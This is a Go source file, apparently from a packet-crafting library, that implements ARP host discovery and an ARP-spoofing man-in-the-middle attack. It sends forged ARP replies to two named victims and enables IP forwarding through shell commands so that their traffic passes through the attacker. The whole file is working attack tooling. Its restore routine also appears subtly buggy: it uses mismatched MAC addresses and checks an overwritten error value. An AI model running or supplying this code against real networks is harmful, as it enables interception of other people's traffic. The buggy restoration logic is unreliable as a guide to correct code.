package higherlevel

import (
	"fmt"
	"github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"log"
	"net"
	"os/exec"
	"time"
)

func ARPScanHost(iface string, targetIP string) (string, error) {
	srcMAC := utils.MacByInt(iface)
	srcIP := utils.IPbyInt(iface)

	ethLayer := packet.EthernetLayer()
	ethLayer.SetSrcMAC(srcMAC)
	ethLayer.SetDstMAC("ff:ff:ff:ff:ff:ff")
	ethLayer.SetEthernetType(layers.EthernetTypeARP)

	arpRequest := packet.ARPLayer()
	arpRequest.SetSrcMac(srcMAC)
	arpRequest.SetSrcIP(srcIP)
	arpRequest.SetDstIP(targetIP)
	arpRequest.SetRequest()
	arpRequest.SetDstMac("ff:ff:ff:ff:ff:ff")

	arpRequestPacket, err := packet.CraftPacket(ethLayer.Layer(), arpRequest.Layer())
	if err != nil {
		return "", err
	}

	for {
		communication.Send(arpRequestPacket, iface)
		pkt := communication.Recv(iface)

		arpLayer := utils.GetARPLayer(pkt)
		if arpLayer != nil && arpLayer.Operation == layers.ARPReply && net.IP(arpLayer.SourceProtAddress).String() == targetIP {
			return net.HardwareAddr(arpLayer.SourceHwAddress).String(), nil
		}

		time.Sleep(1 * time.Second)
	}
}

func enableIPForwarding(iface string) {
	fmt.Println("[*] Enabling IP forwarding and disabling ICMP redirects...")
	exec.Command("sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward").Run()
	exec.Command("sh", "-c", fmt.Sprintf("echo 0 > /proc/sys/net/ipv4/conf/%s/send_redirects", iface)).Run()
	exec.Command("sh", "-c", "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects").Run()
}

func disableIPForwarding() {
	fmt.Println("[*] Disabling IP forwarding...")
	exec.Command("sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward").Run()
}

func ArpMitm(iface, victim1, victim2 string) {
	enableIPForwarding(iface)
	defer disableIPForwarding()
	macVictim1, _ := ARPScanHost(iface, victim1)
	macVictim2, _ := ARPScanHost(iface, victim2)

	intMac := utils.MacByInt(iface)
	arpPacket1, arpPacket2 := CreateFakeArp(victim1, victim2, macVictim1, macVictim2, intMac)

	for i := 0; i < 100; i++ {
		communication.Send(arpPacket1, iface)
		time.Sleep(1 * time.Second)
		communication.Send(arpPacket2, iface)
	}
	fmt.Println("[*] Restoring targets...")

	restoreArp(macVictim1, victim1, victim2, macVictim2, iface)
	fmt.Println("[*] Shutting down...")
}

func restoreArp(macVictim1, victim1, victim2, macVictim2 string, iface string) {
	ethLayer1 := packet.EthernetLayer()
	ethLayer1.SetDstMAC(macVictim1)
	ethLayer1.SetSrcMAC(macVictim2)
	ethLayer1.SetEthernetType(layers.EthernetTypeARP)
	arpPacketOriginal := packet.ARPLayer()
	arpPacketOriginal.SetReply()
	arpPacketOriginal.SetDstIP(victim1)
	arpPacketOriginal.SetSrcIP(victim2)
	arpPacketOriginal.SetSrcMac(macVictim2)
	arpPacketOriginal.SetDstMac(macVictim1)

	ethLayer2 := packet.EthernetLayer()
	ethLayer2.SetDstMAC(macVictim1)
	ethLayer2.SetSrcMAC(macVictim2)
	ethLayer2.SetEthernetType(layers.EthernetTypeARP)
	arpPacketOriginal2 := packet.ARPLayer()
	arpPacketOriginal2.SetReply()
	arpPacketOriginal2.SetDstIP(victim2)
	arpPacketOriginal2.SetSrcIP(victim1)
	arpPacketOriginal2.SetSrcMac(macVictim2)
	arpPacketOriginal2.SetDstMac(macVictim2)

	OriginalArp1, err := packet.CraftPacket(ethLayer1.Layer(), arpPacketOriginal.Layer())
	OriginalArp2, err := packet.CraftPacket(ethLayer2.Layer(), arpPacketOriginal2.Layer())
	if err != nil {
		log.Fatal(err)
	}

	communication.Send(OriginalArp1, iface)
	communication.Send(OriginalArp2, iface)
}

func CreateFakeArp(victim1, victim2, macVictim1, macVictim2, srcMac string) ([]byte, []byte) {
	ethLayer1 := packet.EthernetLayer()
	ethLayer1.SetDstMAC(macVictim1)
	ethLayer1.SetSrcMAC(srcMac)
	ethLayer1.SetEthernetType(layers.EthernetTypeARP)
	arpPacket1 := packet.ARPLayer()
	arpPacket1.SetReply()
	arpPacket1.SetDstIP(victim1)
	arpPacket1.SetSrcIP(victim2)
	arpPacket1.SetDstMac(macVictim1)
	arpPacket1.SetSrcMac(srcMac)

	ethLayer2 := packet.EthernetLayer()
	ethLayer2.SetDstMAC(macVictim2)
	ethLayer2.SetSrcMAC(srcMac)
	ethLayer2.SetEthernetType(layers.EthernetTypeARP)
	arpPacket2 := packet.ARPLayer()
	arpPacket2.SetReply()
	arpPacket2.SetDstIP(victim2)
	arpPacket2.SetSrcIP(victim1)
	arpPacket2.SetDstMac(macVictim2)
	arpPacket2.SetSrcMac(srcMac)

	packet1, err := packet.CraftPacket(ethLayer1.Layer(), arpPacket1.Layer())
	packet2, err := packet.CraftPacket(ethLayer2.Layer(), arpPacket2.Layer())
	if err != nil {
		log.Fatal(err)
	}
	return packet1, packet2
}
